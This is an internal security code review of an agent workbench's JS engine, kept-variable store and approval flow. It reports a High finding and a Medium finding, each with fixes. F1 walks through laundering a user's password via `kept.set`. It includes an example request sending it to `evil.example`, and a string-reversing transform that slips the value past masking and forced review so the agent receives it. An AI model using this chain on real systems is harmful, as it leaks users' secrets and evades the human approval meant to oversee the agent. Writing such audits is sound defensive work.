# v0.3.18 code review, round 1

Base: `f59b9b4fc` (tag `v0.3.17`, chapter v0.3.17 squash merge; its review fixes are inside it, and no
review landed in this chapter before this round). Tip: `ee57299f8`. Diff: 268 commits, 818 files.

Scope: JS engine (`internal/jsengine`), kept variables (`internal/keptvars`, `agentapi/kept.go`,
`agentapi/inputs.go`, `agentapi/send.go`, `bridge/keptvars.go`), API scripts and review
(`dbmcp/api_script.go`, `api_review.go`, `api_tools.go`, `api_inputs.go`, `kept_script.go`,
`jsscript.go`, `approval.go`), DB params and result scripts (`dbmcp/kept_params.go`, `query_script.go`,
`tools.go`, `adapters/sqlparams.go`), frontend `asyncAction.ts`, `guardedDraft.ts` and its callers,
`logFilter.ts`, `queryClient.ts` network mode, `useKeptReveal.ts`, approvals answer mutation.

Counts: High 1, Medium 1, Low 0.

## F1 (High) User-supplied value laundered through `kept.set`: origin binding and forced review both bypassed

Files: `apps/kira-space/internal/dbmcp/kept_script.go:304` (`commit`), `:40` (`secretRead` taint), `:414` (`keptSourceOf`, kind `script`),
`apps/kira-space/internal/dbmcp/api_review.go:51` (`apiReviewFor`),
`apps/kira-space/internal/agentapi/kept.go:137` (`admit`, origin check only for `SourceUser`),
`apps/kira-space/internal/agentapi/send.go:141` `optionsFor` (redirect pin only when `UsesUserValue`).

P679 promises: a user value is sent only to its origin (ARCHITECTURE "Origin binding"), and a script that
reads one always goes through review because a transform can reshape it past the mask (Known open items).
Both hold for the user entry itself, not for a value a transform derives from it:

1. Request A's transform calls `kept.get("pw")` (user value, origin `https://bank.example`) and
   `kept.set("d", kept.get("pw"))`. `readsUserValue` forces the review (reason `userValue`). The user sees
   a harmless result and "Will keep d" with no preview (secret), and sends it.
2. `commit` stores `d` with `Secret: true` (taint) but `Source.Kind` `script` and no `Origin`.
3. Request B: `GET https://evil.example/?x={{kept.d}}`. `admit` checks origin only for `SourceUser`, so
   `d` passes; `UsesUserValue` is false, so no redirect pin. With an allow rule, approval mode `never` or an
   environment that auto-approves reads, no card is shown and the user's password is sent to another origin.
4. Or request B (any URL) has a transform `return kept.get("d").split("").reverse().join("")`. `d` is not
   `SourceUser`, so `readsUserValue` is false and no review is forced; the mask (exact forms only) misses
   the reversed text, and the agent receives the user value unreviewed.

A secret kept value of kind `script` read in a transform has the same reshaping exposure as a user value
(point 4) even without laundering, but today it gets mask-only treatment.

Fix: carry the strongest taint to staged values. When a run read a `SourceUser` entry, either refuse
`kept.set` for that run, or store the derived values as user-tainted (keep the read entry's `Origin`, and
have `admit`, `UsesUserValue`/redirect pin and `readsUserValue` treat the taint like `SourceUser`; refuse
when the run read user values of two origins). Also force review (`apiReviewFor`) whenever a transform
read any secret kept entry, not only a user one, so point 4 cannot happen through a value tainted by other
means. Add a flow test for both chains (E3/E11 style) and update the ARCHITECTURE origin and open-item text.

## F2 (Medium) Revealed secret kept value stays in TanStack mutation `data` after the 60 s hide

File: `apps/kira-space/frontend/src/studio/kept/useKeptReveal.ts:18`, with
`packages/workbench/src/behaviour/asyncAction.ts:49`.

`useKeptReveal` wraps `runReveal` in `useAsyncAction`. `runReveal` returns the plaintext, and
`useAsyncAction`'s mutation stores the thunk's return value as mutation `data`. `hide()` (timer or explicit)
clears only the local `value` ref; the mutation keeps the plaintext as `data` until the component unmounts
(gcTime 0 applies only once no observer is left) or the next reveal. It is visible in the mutation cache
and devtools. The composable's doc says "The plaintext lives only in this ref: never in TanStack or
Pinia", and the P679 Result repeats it.

Fix: have the action resolve to nothing (wrap as `async () => { await runReveal(...); }`) so `data` is
`undefined`, and call `action.reset()` in `hide()`. Consider the same `reset()` after success in
`ConfigSecretsSection` (`save` thunk closes over the typed secret as mutation `variables` until the next
run or unmount).

## Checked, no finding

- `jsengine`: worker spawn and kill on every exit path, RSS poll, watchdog hard ceiling, deadline from slot
  acquisition, host-call relay (one call in flight, `hostRes` buffer 1, `hctx` cancelled on return),
  static `exitError` text, dynamic code blocked, intrinsics frozen. Parent-side `Check` on hostile nesting:
  goja's parser stops at its own nesting limit (verified with a 64 KiB `[[[`, `(((`, `a?b:` source).
- Masking: transform output and failure text go through `Result.Mask` (every live secret kept entry with
  URL and base64 spellings, built at send) plus `keptRun.mask`; prepare cannot read a secret.
- `checkPrepared` reference check, `applyPrepared` field validation, JSON-body kept insertion (quoted span
  refused), header CRLF and `checkFinal`.
- `keptvars.Store`: copies on read and write, `ErrNameTaken` across kinds, sweeper, watcher batches.
- `KeptVarsService.Reveal` behind `localauth.Gated`; `Value` refuses secrets; `clear` works on a copy.
- Approval broker inputs: validated under the lock, wiped on deny, timeout, abandon and already-resolved.
- DB params: placeholder lexer refuses hazards, secret and user entries refused, id recheck at bind time,
  script uses joined to the approval watch; `deliverQuery` drops staged values via the caller's defer.
- Frontend: `useGuardedDraft` callers pass a JSON `key` for object drafts; `useLogFilter` caches lower-case
  text per line; network mode per client profile.
